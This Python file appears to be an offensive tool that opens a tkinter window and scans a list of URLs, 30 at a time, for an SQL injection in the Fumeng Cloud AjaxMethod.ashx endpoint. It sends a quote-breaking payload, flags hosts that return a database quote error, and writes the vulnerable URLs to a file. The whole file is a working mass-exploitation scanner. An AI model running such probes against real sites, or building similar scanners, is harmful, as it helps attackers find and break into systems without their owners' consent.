import requests
import tkinter as tk
from tkinter import scrolledtext
from tkinter import *
from PIL.ImageTk import PhotoImage
from concurrent.futures import ThreadPoolExecutor
from ttkbootstrap.constants import *
def fumengyun_sql_exp(url):
    poc = r"""/Ajax/AjaxMethod.ashx?action=getEmpByname&Name=Y%27"""
    url = url + poc
    try:
        res = requests.get(url, verify=False, timeout=3)
        if "字符串 'Y'' 后的引号不完整。" in res.text:
            fumengyun_sql_text.insert(END,"[! ! ! ! ! ! ] Vulnerable url:" + url + "\n")
            fumengyun_sql_text.see(END)
            with open ("[exists]fumengyun_sql_injection_url.txt", 'a') as f:
                f.write(url + "\n")
        else:
            fumengyun_sql_text.insert(END,"[×]URL without vulnerability:" + url + "\n")
            fumengyun_sql_text.see(END)
    except Exception as err:
        fumengyun_sql_text.insert(END, "[×]The target request failed, and the error content:" + str(err) + "\n")
        fumengyun_sql_text.see(END)
def get_fumengyun_sql_addr():
    with open("corrected url.txt","r") as f:
        for address in f.readlines():
            address = address.strip()
            yield address
def fumengyun_sql_gui():
    fumengyun_sql = Toplevel()
    fumengyun_sql.geometry("1035x455")
    fumengyun_sql.title("Fumeng Cloud AjaxMethod.ashx SQLinjection [auto-muti-exp]")
    fumengyun_sql.resizable(0, 0)
    logo = PhotoImage(file="./logo.ico")
    fumengyun_sql.tk.call('wm', 'iconphoto', fumengyun_sql._w, logo)
    global fumengyun_sql_text
    fumengyun_sql_text = scrolledtext.ScrolledText(fumengyun_sql,width=123, height=25)
    fumengyun_sql_text.grid(row=0, column=0, padx=10, pady=10)
    fumengyun_sql_text.see(END)
    addrs = get_fumengyun_sql_addr()
    max_thread_num = 30
    executor = ThreadPoolExecutor(max_workers=max_thread_num)
    for addr in addrs:
        future = executor.submit(fumengyun_sql_exp, addr)
    fumengyun_sql.mainloop()